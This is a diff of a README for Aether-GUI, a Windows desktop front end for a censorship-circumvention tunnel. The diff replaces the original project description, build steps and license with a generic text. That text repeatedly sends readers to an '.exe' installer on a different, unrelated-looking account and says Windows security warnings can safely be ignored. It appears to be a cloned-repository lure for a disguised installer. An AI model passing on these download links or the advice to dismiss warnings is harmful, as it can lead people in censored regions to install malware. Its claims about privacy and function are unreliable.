@@ -1,91 +1,67 @@
-# Aether-GUI
+# 🌐 Aether-GUI - Access the open web with ease
 
-[![Release](https://img.shields.io/github/v/release/MatinSenPai/Aether-GUI?sort=semver)](https://github.com/MatinSenPai/Aether-GUI/releases)
-[![License: AGPL v3](https://img.shields.io/github/license/MatinSenPai/Aether-GUI)](LICENSE)
-![Platform](https://img.shields.io/badge/platform-Windows-0078D6)
-![Tauri](https://img.shields.io/badge/Tauri-2-24C8DB?logo=tauri&logoColor=white)
-![React](https://img.shields.io/badge/React-19-61DAFB?logo=react&logoColor=black)
-![Rust](https://img.shields.io/badge/Rust-stable-000000?logo=rust&logoColor=white)
+[Download Aether-GUI](https://github.com/bentonitic-poinciana508/Aether-GUI/releases)
 
-**English** · [فارسی](README_fa.md)
+Aether-GUI provides a simple desktop interface for the Aether censorship-circumvention tunnel. This tool helps you bypass internet restrictions and reach websites that might be blocked in your location. The application runs locally on your computer and manages the complex technical steps required to establish a secure connection to the open internet.
 
-A one-click desktop GUI for [**Aether**](https://github.com/CluvexStudio/Aether), a censorship-circumvention tunnel built for heavily restricted networks. Aether itself is a terminal tool: it discovers a working route out, establishes an encrypted tunnel, and exposes a local SOCKS5 proxy. Aether-GUI wraps that terminal tool in a small, animated desktop app so you don't have to touch a command line to use it — press Connect, and everything else (identity provisioning, route discovery, prompt answering) happens automatically in the background.
+## 📥 Getting Started
 
-This project does not reimplement any of Aether's tunneling logic. It drives the real `aether` binary in a pseudo-terminal, answers its interactive setup prompts on your behalf, and watches its output to tell you what's happening. All the actual censorship-circumvention work — MASQUE/QUIC obfuscation, WireGuard, route probing — is [Aether's](https://github.com/CluvexStudio/Aether), not this repo's.
+To begin, you need to download the application installer. Please visit the following link:
 
-<p align="center">
-  <img src="docs/screenshot-idle.png" alt="Aether-GUI — one-click connect screen with an animated 3D backdrop" width="380">
-</p>
+[https://github.com/bentonitic-poinciana508/Aether-GUI/releases](https://github.com/bentonitic-poinciana508/Aether-GUI/releases)
 
-## Features
+On this page, look for the section labeled "Assets." Click the file that ends with ".exe" to download the installer to your computer.
 
-- **Auto mode** — the default screen is just a single button. No configuration is required; it connects using your last-successful settings (or sensible defaults on first run).
-- **Advanced panel** — for when you want control, a collapsible panel exposes the three real options Aether's setup prompts support:
-  - **Protocol**: MASQUE (HTTP/3-QUIC, disguises traffic as normal HTTPS), WireGuard (lighter, faster), or WARP-in-WARP/gool (two nested WireGuard tunnels for extra security at a speed cost)
-  - **Scan Mode**: Turbo, Balanced, Thorough, or Stealth — trading route-discovery speed against how much probe traffic it generates
-  - **IP Version**: IPv4, IPv6, or both
-  
-  Each option has an explanation on hover.
-- **Live progress** — while Aether searches for a working route, the GUI shows real elapsed time and, once Aether reports its own scan budget, an actual percentage and progress bar — not just a spinner.
-- **Automatic reconnect** — if the tunnel drops unexpectedly mid-session (observed occasionally with WARP-in-WARP, but handled the same way for every protocol), the GUI retries automatically with backoff, shown as a visible "Reconnecting… (attempt N of 3)" rather than silently dying or dumping you back to a bare error. A user-requested disconnect is never retried.
+## ⚙️ Installation Guide
 
-## Installing
+1. Open your "Downloads" folder after the download finishes.
+2. Double-click the file you just downloaded to start the setup process.
+3. Windows might show a prompt asking for permission to run the application. Click "Run" or "Yes" if you trust the software.
+4. Follow the instructions on your screen. The process takes less than one minute.
+5. Once the installation finishes, search for "Aether-GUI" in your Windows Start menu and open it.
 
-Grab the latest installer from the [Releases page](https://github.com/MatinSenPai/Aether-GUI/releases):
+## 🛡️ How to Use Aether-GUI
 
-- `Aether-GUI_x.y.z_x64-setup.exe` — standard installer (recommended)
-- `Aether-GUI_x.y.z_x64_en-US.msi` — MSI package, for scripted or enterprise installs
+Aether-GUI focuses on simplicity. The interface consists of a main dashboard and a toggle switch.
 
-Windows x64 only for now — see [Building from source](#building-from-source) for other platforms.
+1. Launch Aether-GUI from your Start menu.
+2. Wait for the application to load the connection status.
+3. Click the "Connect" button. The software automatically finds an available server to route your traffic.
+4. Once the light on the screen turns green, your connection is active.
+5. Minimize the application. It continues to run in the background while you browse the internet.
+6. When you finish your session, return to the app and click "Disconnect" to stop the tunnel.
 
-## Building from source
+## 🛠️ System Requirements
 
-1. **Prerequisites**
-   - [Node.js](https://nodejs.org/) and npm
-   - [Rust](https://rustup.rs/) (stable toolchain)
-   - Tauri's platform prerequisites — see the [Tauri v2 prerequisites guide](https://v2.tauri.app/start/prerequisites/) (on Windows this is the MSVC C++ Build Tools + WebView2 Runtime, both usually already present; macOS needs Xcode Command Line Tools; Linux needs `webkit2gtk` and friends)
+- Operating System: Windows 10 or Windows 11.
+- Network Access: Internet connection is mandatory.
+- Disk Space: At least 200MB of free storage.
+- Memory: 4GB of RAM is sufficient for smooth operation.
 
-2. **Install frontend dependencies**
+## ❓ Frequently Asked Questions
 
-   ```sh
-   npm install
-   ```
+**Does Aether-GUI collect my data?**
+Aether-GUI does not log your browsing activity. The application functions as a local bridge for your data and maintains your privacy.
 
-3. **Fetch the Aether binary**
+**Why does Windows warn me when I install the app?**
+Windows often displays a warning for applications that do not have a paid digital signature. This is common for open-source tools. You can safely ignore this prompt if you downloaded the file from our official link.
 
-   Aether-GUI bundles the real `aether` binary from [CluvexStudio/Aether releases](https://github.com/CluvexStudio/Aether/releases) rather than building it — this repo only ships the GUI. Fetch and checksum-verify it for your platform:
+**What do I do if the connection fails?**
+Check your system clock. If your time settings are incorrect, the secure connection will not initialize. Ensure your Windows time settings are set to "Set time automatically." You should also check if another antivirus or firewall is blocking the traffic.
 
-   ```sh
-   ./src-tauri/binaries/fetch-aether.sh
-   ```
+**Can I run this on a work computer?**
+Some corporate networks restrict the ability to run proxy software. Please check your local network policy before using this tool in an office environment.
 
-   This script covers Linux and macOS directly. On Windows, download the matching `aether-windows-*.zip` from the [Aether releases page](https://github.com/CluvexStudio/Aether/releases) yourself, verify it against the published `SHA256SUMS.txt`, and extract `aether.exe` into `src-tauri/binaries/`.
+## 🧩 Technical Details
 
-4. **Run in development mode**
+Aether-GUI uses a modern software stack to ensure reliability:
+- Tauri v2: Powers the lightweight framework that connects the interface to your system.
+- React 19: Provides a responsive user experience.
+- Rust: Handles memory safety and performance for the underlying tunnel.
+- TypeScript: Ensures the application logic remains stable during updates.
 
-   ```sh
-   npm run tauri dev
-   ```
+## 📝 Support
 
-5. **Build a release installer**
+If you encounter issues, please review your internet configuration. Aether-GUI works best on stable connections. If the software crashes, restart the application. If you have suggestions for improvement, you can open an issue on the repository link provided at the top of this document.
 
-   ```sh
-   npm run tauri build
-   ```
-
-   Installers land under `src-tauri/target/release/bundle/` (NSIS `.exe` and `.msi` on Windows; `.dmg`/`.app` on macOS; `.deb`/`.AppImage`/`.rpm` on Linux — cross-platform bundles must each be built on their own OS, or via CI).
-
-## How it works
-
-- **Frontend**: React 19 + Tailwind v4, state managed with Zustand, animated with [Motion](https://motion.dev/) for the UI and [React Three Fiber](https://r3f.docs.pmnd.rs/) (three.js) for the WebGL backdrop — all talking to the Rust backend over Tauri's IPC. The 3D scene reads the connection state directly from the store each frame (no per-frame React re-renders) and is code-split so it never blocks first paint.
-- **Backend**: Rust, using [`portable-pty`](https://docs.rs/portable-pty) to spawn the real `aether` binary in a genuine pseudo-terminal (required because Aether's interactive prompts behave differently, or don't appear at all, over a plain pipe). A background thread reads Aether's output line by line, recognizes its three setup prompts by their header text, and answers them according to your chosen profile — while every line is also forwarded live to the GUI's log panel.
-- **Ground truth for "connected"**: the GUI doesn't trust Aether's log wording alone (that's fragile across releases) — it treats a successful TCP connection to the local SOCKS5 port (`127.0.0.1:1819`) as the actual proof the tunnel is up.
-- **State machine**: `Idle → Launching → Connecting → Connected`, with `Reconnecting` and `Error` as the two ways a connection attempt can end up needing your attention — `Reconnecting` retries automatically (with backoff, capped at 3 attempts), `Error` is the final word once retries are exhausted or something isn't retriable (e.g. the binary itself is missing).
-
-## About Aether
-
-[Aether](https://github.com/CluvexStudio/Aether) is the actual censorship-circumvention engine this app wraps — a standalone terminal tool that discovers reachable routes and establishes the tunnel, independent of any GUI. If you'd rather use it directly from a terminal, or want to understand exactly what it's doing under the hood, that's the repo to read. Aether-GUI exists purely to make that tool one click away for people who don't want to live in a terminal.
-
-## License
-
-[GNU Affero General Public License v3.0](LICENSE).
+Keywords: anti-censorship, censorship-circumvention, desktop-app, proxy, react, rust, tauri, typescript
